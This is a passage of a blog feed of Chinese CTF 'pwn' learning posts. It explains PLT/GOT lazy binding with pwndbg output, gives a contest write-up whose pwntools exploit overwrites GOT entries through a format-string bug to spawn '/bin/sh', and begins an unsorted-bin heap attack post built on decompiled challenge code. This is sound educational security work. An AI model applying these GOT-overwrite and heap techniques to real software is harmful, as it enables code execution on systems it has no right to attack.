href=\"https://blog.csdn.net/qq_52126646/article/details/119494939\">https://blog.csdn.net/qq_52126646/article/details/119494939</a></p>\n<h2 id=\"延迟绑定\"><a href=\"#延迟绑定\" class=\"headerlink\" title=\"延迟绑定\"></a>延迟绑定</h2><p>​\t\t以上一篇博客的题目为例</p>\n<p>​\t\tcall一个函数的时候,先到plt     0x400650 &lt;system@plt&gt;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p system</span><br><span class=\"line\">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x400650 &lt;system@plt&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t然后plt里面第一条 jmp     cs:off_600D38 这里会跳到 system@got的地址,(此时还没有初始化)</p>\n<p>​\t\tdisplay &#x2F;3i $rip 设置单步执行后自动显示的内容,这里显示后续三条指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; display /3i $rip</span><br><span class=\"line\">2: x/3i $rip</span><br><span class=\"line\">=&gt; 0x400650 &lt;system@plt&gt;:\tjmp    QWORD PTR [rip+0x2006e2]        # 0x600d38</span><br><span class=\"line\">   0x400656 &lt;system@plt+6&gt;:\tpush   0x2</span><br><span class=\"line\">   0x40065b &lt;system@plt+11&gt;:\tjmp    0x40062</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t之后,0x600d38里面的地址是system@plt刚才jmp的下一条,push 0x2,然后再jmp 0x40062,也就是PLT[0],跳转到动态链接器进行地址解析.找到真正的地址,填入got地址,也就是0x600d38,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/20wx 0x600d38</span><br><span class=\"line\">0x600d38:\t0x00400656\t0x00000000\t0xf7a46e40\t0x00007fff</span><br><span class=\"line\">0x600d48:\t0xf7a46f10\t0x00007fff\t0xf7af2020\t0x00007fff</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">.plt:0000000000400650 ; int system(const char *command)</span><br><span class=\"line\">.plt:0000000000400650 _system         proc near               ; CODE XREF: main+DE↓p</span><br><span class=\"line\">.plt:0000000000400650                 jmp     cs:off_600D38</span><br><span class=\"line\">.plt:0000000000400650 _system         endp</span><br><span class=\"line\">.plt:0000000000400650</span><br><span class=\"line\">.plt:0000000000400656 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.plt:0000000000400656                 push    2</span><br><span class=\"line\">.plt:000000000040065B                 jmp     sub_400620</span><br><span class=\"line\">  </span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t下次在执行的时候,直接就plt-&gt;got的第一个jmp -&gt; 实际地址,也就是说0x600d38里存储的是system的真实内存地址了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">20</span>wx <span class=\"number\">0x600d38</span></span><br><span class=\"line\"><span class=\"number\">0x600d38</span>:\t<span class=\"number\">0xf7a31420</span>\t<span class=\"number\">0x00007fff</span>\t<span class=\"number\">0xf7a46e40</span>\t<span class=\"number\">0x00007fff</span></span><br><span class=\"line\"><span class=\"number\">0x600d48</span>:\t<span class=\"number\">0xf7a46f10</span>\t<span class=\"number\">0x00007fff</span>\t<span class=\"number\">0xf7af2020</span>\t<span class=\"number\">0x00007fff</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">20</span>wx <span class=\"number\">0x00007ffff7a31420</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7a31420</span> &lt;__libc_system&gt;:\t<span class=\"number\">0x74ff8548</span>\t<span class=\"number\">0xfa66e90b</span>\t<span class=\"number\">0x0f66ffff</span>\t<span class=\"number\">0x0000441f</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7a31430</span> &lt;__libc_system+<span class=\"number\">16</span>&gt;:\t<span class=\"number\">0x593d8d48</span>\t<span class=\"number\">0x48001649</span>\t<span class=\"number\">0xe808ec83</span>\t<span class=\"number\">0xfffffa50</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7a31440</span> &lt;__libc_system+<span class=\"number\">32</span>&gt;:\t<span class=\"number\">0x940fc085</span>\t<span class=\"number\">0xc48348c0</span>\t<span class=\"number\">0xc0b60f08</span>\t<span class=\"number\">0x001f0fc3</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7a31450</span> &lt;__GI___realpath&gt;:\t<span class=\"number\">0xe5894855</span>\t<span class=\"number\">0x56415741</span>\t<span class=\"number\">0x54415541</span>\t<span class=\"number\">0xec814853</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-11-2%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E5%8F%8A%E5%8F%8D%E6%80%9D/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-11-2%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E5%8F%8A%E5%8F%8D%E6%80%9D/",
            "title": "pwn入门-11-2月月赛题及反思",
            "date_published": "2023-02-26T01:56:50.000Z",
            "content_html": "<p>​\t\t2.25号月赛,只有一道pwn题,格式化字符串,其实本身抱着一种相对良好的心态,觉得自己学了一段时间了,前段时间刚看的格式化字符串,应该没什么问题………但还是寄了,其他方向队友都做出来了,就只剩自己这一道pwn题了…感觉比较受打击……</p>\n<p>​\t\t在做题的时候,漏洞点很明显,关于如何利用,自己想了很多很多,越想越复杂,越搞心态越崩.结束后看了下exp,其实比自己想的简单多的多.</p>\n<p>​\t\t总结一下,问题有好几个,一个是调试程序不熟练,浪费很多时间,最重要的一个问题还是<font color=\"red\">基础不牢,有些点想不到或者模棱两可,逻辑链连不上,就很容易想复杂</font>,不确定可不可以,就导致了自己很犹豫要不要尝试一下这种攻击手法</p>\n<p>​\t\t这道题其实就是替换函数地址的事,主要是要搞清楚plt,got的关系以及延迟绑定就可以了.</p>\n<p>​\t\t题目链接:<a href=\"https://tangzichengcc.github.io/2023/02/26/pwn%E5%85%A5%E9%97%A8-11-2%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E5%8F%8A%E5%8F%8D%E6%80%9D/ezfmt\">https://tangzichengcc.github.io/2023/02/26/pwn入门-11-2月月赛题及反思/ezfmt</a></p>\n<p>​\t\texp如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./ezfmt&#x27;</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Choice:&#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,&#x27;b *0x04008E1&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#payload=&#x27;aaaaaaaa&#x27;+&#x27;%6$p&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#system plt -&gt;main</span></span><br><span class=\"line\"><span class=\"comment\">#atoi -&gt; system got</span></span><br><span class=\"line\"></span><br><span class=\"line\">system_got=<span class=\"number\">0x000000000600D38</span></span><br><span class=\"line\">again=<span class=\"number\">0x00000000004007B7</span>  <span class=\"comment\">#选择 </span></span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got=<span class=\"number\">0x600D70</span></span><br><span class=\"line\">system_plt=<span class=\"number\">0x400656</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=fmtstr_payload(<span class=\"number\">6</span>,&#123;system_got:again,atoi_got:system_plt&#125;)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t1.替换的是.got.plt里的地址 , 替换成的again就是.text段sub_4007B7的地址,这样的话,就可以劫持控制流,再次回来.</p>\n<p>​\t\t意思就是call system的时候先去plt,然后进got.plt里的地址,就直接执行4007b7的指令了,没问题</p>\n<p>​\t\t2.同时把获取选择参数的函数atoi换成system(这里为什么又是plt了呢? 因为system的got表里地址还没有初始化,而且被替换了,那就只能是plt,如果初始化了呢? 调用应该也没问题,都是一样的代码,)</p>\n<p>​\t\tatoi的got地址,换成system的plt地址的话, call atoi –&gt; atoi的plt–&gt;atoi的got –&gt; system的plt –&gt; system的got<font color=\"red\">(注意,这里不一样了,这里不是got的第一条指令,如果是的话,就还是跳到我们第一步覆盖的again那里了,覆盖的是下一条,就是push,然后jump到dl_runtime_resolve初始化那里) plt具体内容等下一篇博客写吧,正常来说,400650才是它的开头,但不能跳到这里,不然就到again了下一条就可以了</font></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.plt:0000000000400650 ; int system(const char *command)</span><br><span class=\"line\">.plt:0000000000400650 _system         proc near               ; CODE XREF: main+DE↓p</span><br><span class=\"line\">.plt:0000000000400650                 jmp     cs:off_600D38</span><br><span class=\"line\">.plt:0000000000400650 _system         endp</span><br><span class=\"line\">.plt:0000000000400650</span><br><span class=\"line\">.plt:0000000000400656 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.plt:0000000000400656                 push    2</span><br><span class=\"line\">.plt:000000000040065B                 jmp     sub_400620</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t注意最后要再给它输入一个&#x2F;bin&#x2F;sh, \\x00好像无所谓的</p>\n<p>​\t\tcontext.arch&#x3D;’amd64’ 如果不加的话也会有问题,为啥呢……….?</p>\n<p>​\t\t如何进行 调试呢??? 可以看看xuanxuan那个博客</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/",
            "title": "pwn入门-10-堆入门之堆溢出及unsorted_bin攻击",
            "date_published": "2023-02-24T02:06:55.000Z",
            "content_html": "<p>​\t\t堆题其实是目前比较基础的题,栈题都比较少了貌似…自己的进度有点慢,虽然上学期接触到了堆,但也学的一知半解.</p>\n<p>​\t\t最近上了NeSE创始人、带队老师龚老师的课,老师第一节课给的测试题就是一道堆题,看了看他后面的课件,重点也在堆上,所以觉得可以先把栈什么的稍微放一放了,基础其实差不多了,提升的话,可以慢慢来,先赶紧继续学堆.</p>\n<p>​\t\t</p>\n<p>题目链接: 本篇博客地址url + oork_note即可</p>\n<h1 id=\"unsorted-bin基础知识\"><a href=\"#unsorted-bin基础知识\" class=\"headerlink\" title=\"unsorted bin基础知识\"></a>unsorted bin基础知识</h1><p>参考:<a href=\"https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/\">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/</a></p>\n<p>​\t\tUnsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p>\n<p>​\t\tUnsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p>\n<h2 id=\"基本来源\"><a href=\"#基本来源\" class=\"headerlink\" title=\"基本来源\"></a>基本来源</h2><ol>\n<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>\n<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。</li>\n<li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li>\n</ol>\n<h2 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h2><pre><code>     在 [glibc](https://code.woboq.org/userspace/glibc/)/[malloc](https://code.woboq.org/userspace/glibc/malloc/)/[malloc.c](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html) 中的 `_int_malloc` 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 `bck-&gt;fd` 的位置写入本 Unsorted Bin 的位置,就是一个很大的值,比如0xffffffffxxxx\n</code></pre>\n<p>​\t换句话说, bck-&gt;fd 也就是 bk(也就是要修改的地址,所以溢出修改的chunk的bk应该是要修改的地址-0x10),  victim-&gt;bk-&gt;fd &#x3D; victim</p>\n<p>​\tav是当前chunk, (av)-&gt;bk &#x3D; bck,就是当前chunk的bk, 晕了晕了,回头看看源码 victim, av什么的</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/image-20230303140544704.png\" alt=\"image-20230303140544704\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* remove from unsorted list */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class=\"line\">  malloc_printerr (<span class=\"string\">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class=\"line\">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class=\"line\">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"测试题目-oork-note\"><a href=\"#测试题目-oork-note\" class=\"headerlink\" title=\"测试题目 oork_note\"></a>测试题目 oork_note</h1><p>​\t\t一看就是一道堆题,给出了一个菜单.然后会让你输入7次,也就是一周的日记,要输入长度和内容,这里没有问题,<font color=\"red\">注意一个细节,就是你输入的长度会有个操作 v2 +&#x3D; 144;  也就是增大了0x90,这个后面会用到</font></p>\n<p>​\t\t然后就是编辑和删除操作了,</p>\n<p>​\t\t拿flag其实很明显,就是要把0x6020D4的值修改为一个比167大的值就可以了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(__int64 a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v5; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  sub_4008F6();</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Welcome to 997 wellfare! This program records your weekly workloads.&quot;</span>);</span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v5 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v4 &lt;= <span class=\"number\">6</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Day %d in this weekend.\\n&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(v4 + <span class=\"number\">1</span>));</span><br><span class=\"line\">    v5 += sub_400939(v4++);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Do you need to edit your note? y/n&quot;</span>);</span><br><span class=\"line\">  getchar();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( getchar() == <span class=\"number\">121</span> )</span><br><span class=\"line\">    sub_400B62();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( dword_6020D4 &gt; <span class=\"number\">167</span> )</span><br><span class=\"line\">    system(<span class=\"string\">&quot;cat ./flag&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You are fired, Bye.&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_400939</span><span class=\"params\">(<span class=\"type\">int</span> a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+1Ch] [rbp-14h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *buf; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\tInput the length of your work note:&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v2);</span><br><span class=\"line\">  v2 += <span class=\"number\">144</span>;</span><br><span class=\"line\">  buf = <span class=\"built_in\">malloc</span>(v2);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\tInput context of your work record:&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, v2);</span><br><span class=\"line\">  *(&amp;ptr + a1) = buf;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)((v2 &amp; (rand() + <span class=\"number\">255</span>)) % <span class=\"number\">23</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t下面看一下编辑和删除,删除的话,把指针也赋0了,所以没有double free的问题,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_400B62</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input your choice: \\n\\t1.edit note\\n\\t2.delete note\\n\\t0.exit&quot;</span>);</span><br><span class=\"line\">        __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v1);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v1 != <span class=\"number\">1</span> )</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        sub_400A14();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v1 != <span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      sub_400AEE();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v1 );</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_400A14</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v0; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;input the note index to edit:&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v2);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &lt;= <span class=\"number\">6</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input the content:&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(&amp;ptr + (<span class=\"type\">int</span>)v2) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, *(&amp;ptr + (<span class=\"type\">int</span>)v2), <span class=\"number\">0x4F0</span>uLL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v0 = v2;</span><br><span class=\"line\">      *(&amp;ptr + v0) = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x3A0</span>uLL);</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, *(&amp;ptr + (<span class=\"type\">int</span>)v2), <span class=\"number\">0x3A0</span>uLL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">sub_400AEE</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;input the note index to delete:&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(*(&amp;ptr + v1));</span><br><span class=\"line\">  *(&amp;ptr + v1) = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t但是这里有个很明显的问题,就是在编辑操作这里,如果编辑地址存在,可以读入0x4f0大小,<font 